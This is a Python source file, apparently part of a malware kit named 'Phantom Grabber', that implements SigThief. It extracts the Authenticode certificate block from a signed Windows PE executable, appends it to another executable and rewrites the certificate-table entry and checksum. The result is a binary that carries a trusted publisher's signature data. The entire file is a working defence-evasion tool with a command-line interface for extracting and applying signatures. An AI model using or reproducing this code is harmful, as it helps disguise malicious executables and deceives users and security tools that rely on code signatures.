# Phantom Grabber — SigThief (Authenticode Signature Transplant)
# Extracts and transplants Authenticode certificates between PE executables.
# Pure Python implementation using struct for binary parsing.

import struct
import os
import logging

logger = logging.getLogger("SigThief")

# PE constants
DOS_HEADER_SIZE = 64
PE_SIGNATURE = b"PE\x00\x00"
COFF_HEADER_SIZE = 20
PE32_MAGIC = 0x10B
PE32PLUS_MAGIC = 0x20B

# Certificate Table is Data Directory entry index 4
CERT_TABLE_INDEX = 4
DATA_DIR_ENTRY_SIZE = 8  # 4 bytes VirtualAddress + 4 bytes Size


def _parse_pe_headers(data: bytes) -> dict | None:
    """Parse PE headers and return key offsets needed for certificate operations.

    Returns a dict with:
        - pe_offset: offset of PE signature
        - coff_offset: offset of COFF header
        - optional_header_offset: offset of Optional Header
        - is_pe32plus: bool
        - cert_table_offset: file offset of the Certificate Table data dir entry
        - cert_table_va: VirtualAddress from cert table entry (file offset of cert data)
        - cert_table_size: Size from cert table entry
        - size_of_optional_header: from COFF
        - checksum_offset: file offset of the Checksum field
    """
    if len(data) < DOS_HEADER_SIZE:
        logger.error("File too small for DOS header")
        return None

    # DOS header: e_magic at 0, e_lfanew at 0x3C
    e_magic = struct.unpack_from("<H", data, 0)[0]
    if e_magic != 0x5A4D:  # 'MZ'
        logger.error(f"Invalid DOS signature: 0x{e_magic:04X}")
        return None

    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]

    # PE signature
    if len(data) < e_lfanew + 4:
        logger.error("File too small for PE signature")
        return None

    pe_sig = data[e_lfanew:e_lfanew + 4]
    if pe_sig != PE_SIGNATURE:
        logger.error(f"Invalid PE signature at offset 0x{e_lfanew:X}")
        return None

    pe_offset = e_lfanew
    coff_offset = pe_offset + 4

    # COFF header: 20 bytes
    if len(data) < coff_offset + COFF_HEADER_SIZE:
        logger.error("File too small for COFF header")
        return None

    size_of_optional_header = struct.unpack_from("<H", data, coff_offset + 16)[0]
    optional_header_offset = coff_offset + COFF_HEADER_SIZE

    if len(data) < optional_header_offset + 2:
        logger.error("File too small for Optional Header magic")
        return None

    oh_magic = struct.unpack_from("<H", data, optional_header_offset)[0]

    match oh_magic:
        case 0x10B:
            is_pe32plus = False
            # PE32: Certificate Table data dir entry at OH + 128
            cert_dir_offset = optional_header_offset + 128
            checksum_offset = optional_header_offset + 64
        case 0x20B:
            is_pe32plus = True
            # PE32+: Certificate Table data dir entry at OH + 144
            cert_dir_offset = optional_header_offset + 144
            checksum_offset = optional_header_offset + 64
        case _:
            logger.error(f"Unknown Optional Header magic: 0x{oh_magic:04X}")
            return None

    # Read Certificate Table entry (VirtualAddress + Size)
    if len(data) < cert_dir_offset + DATA_DIR_ENTRY_SIZE:
        logger.error("File too small for Certificate Table data directory entry")
        return None

    cert_va, cert_size = struct.unpack_from("<II", data, cert_dir_offset)

    return {
        "pe_offset": pe_offset,
        "coff_offset": coff_offset,
        "optional_header_offset": optional_header_offset,
        "is_pe32plus": is_pe32plus,
        "cert_table_offset": cert_dir_offset,
        "cert_table_va": cert_va,
        "cert_table_size": cert_size,
        "size_of_optional_header": size_of_optional_header,
        "checksum_offset": checksum_offset,
    }


def outputCert(signedfile: str, certfile: str) -> bool:
    """Extract the Authenticode certificate from a signed PE and save to certfile.

    Args:
        signedfile: Path to a signed PE executable.
        certfile: Path to write the extracted certificate data.

    Returns:
        True if certificate was extracted successfully, False otherwise.
    """
    logger.info(f"Extracting certificate from {signedfile}")

    if not os.path.isfile(signedfile):
        logger.error(f"Signed file not found: {signedfile}")
        return False

    with open(signedfile, "rb") as f:
        data = f.read()

    headers = _parse_pe_headers(data)
    if headers is None:
        return False

    cert_va = headers["cert_table_va"]
    cert_size = headers["cert_table_size"]

    if cert_va == 0 or cert_size == 0:
        logger.error("No certificate table found in the PE (VA=0 or Size=0)")
        return False

    if len(data) < cert_va + cert_size:
        logger.error(
            f"Certificate data extends beyond file: "
            f"offset=0x{cert_va:X}, size={cert_size}, filesize={len(data)}"
        )
        return False

    cert_data = data[cert_va:cert_va + cert_size]
    logger.info(f"Certificate extracted: {len(cert_data)} bytes at offset 0x{cert_va:X}")

    with open(certfile, "wb") as f:
        f.write(cert_data)

    logger.info(f"Certificate saved to {certfile}")
    return True


def signfile(signedfile: str, certfile: str, outputfile: str) -> bool:
    """Copy an Authenticode certificate onto a PE executable.

    The certificate data from certfile is appended to the PE in outputfile,
    and the PE headers are updated to reference the new certificate location.

    Args:
        signedfile: Path to the target PE executable to sign.
        certfile: Path to the certificate data file (extracted by outputCert).
        outputfile: Path to write the signed PE. Can be the same as signedfile.

    Returns:
        True if the certificate was applied successfully, False otherwise.
    """
    logger.info(f"Applying certificate from {certfile} to {signedfile}")

    if not os.path.isfile(signedfile):
        logger.error(f"Target file not found: {signedfile}")
        return False

    if not os.path.isfile(certfile):
        logger.error(f"Certificate file not found: {certfile}")
        return False

    with open(signedfile, "rb") as f:
        pe_data = bytearray(f.read())

    with open(certfile, "rb") as f:
        cert_data = f.read()

    if len(cert_data) == 0:
        logger.error("Certificate file is empty")
        return False

    headers = _parse_pe_headers(bytes(pe_data))
    if headers is None:
        return False

    cert_dir_offset = headers["cert_table_offset"]
    old_cert_va = headers["cert_table_va"]
    old_cert_size = headers["cert_table_size"]

    # If the PE already has a certificate, we need to strip it first
    if old_cert_va > 0 and old_cert_size > 0:
        # Check if cert is at the end of the file (typical case)
        if old_cert_va + old_cert_size == len(pe_data):
            # Truncate the old certificate
            pe_data = pe_data[:old_cert_va]
            logger.info(f"Stripped existing certificate ({old_cert_size} bytes)")
        else:
            logger.warning(
                "Existing certificate is not at EOF; "
                "appending new cert without removing old one"
            )

    # Align the PE to 8-byte boundary before appending cert
    # (WIN_CERTIFICATE structures must be 8-byte aligned)
    while len(pe_data) % 8 != 0:
        pe_data.append(0)

    # The new certificate VA is at the current end of the file
    new_cert_va = len(pe_data)
    new_cert_size = len(cert_data)

    # Append the certificate data
    pe_data.extend(cert_data)

    # Update the Certificate Table data directory entry
    struct.pack_into("<II", pe_data, cert_dir_offset, new_cert_va, new_cert_size)
    logger.info(
        f"Updated Certificate Table: VA=0x{new_cert_va:X}, Size={new_cert_size}"
    )

    # Zero out the checksum (it will be invalid anyway, and most loaders don't check it)
    checksum_offset = headers["checksum_offset"]
    struct.pack_into("<I", pe_data, checksum_offset, 0)

    # Write the output
    with open(outputfile, "wb") as f:
        f.write(pe_data)

    logger.info(f"Signed PE written to {outputfile} ({len(pe_data)} bytes)")
    return True


if __name__ == "__main__":
    import sys as _sys

    logging.basicConfig(level=logging.INFO, format="[%(name)s] %(message)s")

    if len(_sys.argv) < 3:
        print("Usage:")
        print(f"  Extract cert: {_sys.argv[0]} extract <signed.exe> <cert.out>")
        print(f"  Apply cert:   {_sys.argv[0]} sign <target.exe> <cert.in> <output.exe>")
        _sys.exit(1)

    match _sys.argv[1]:
        case "extract":
            if len(_sys.argv) < 4:
                print("Need: extract <signed.exe> <cert.out>")
                _sys.exit(1)
            success = outputCert(_sys.argv[2], _sys.argv[3])
            _sys.exit(0 if success else 1)
        case "sign":
            if len(_sys.argv) < 5:
                print("Need: sign <target.exe> <cert.in> <output.exe>")
                _sys.exit(1)
            success = signfile(_sys.argv[2], _sys.argv[3], _sys.argv[4])
            _sys.exit(0 if success else 1)
        case _:
            print(f"Unknown command: {_sys.argv[1]}")
            _sys.exit(1)
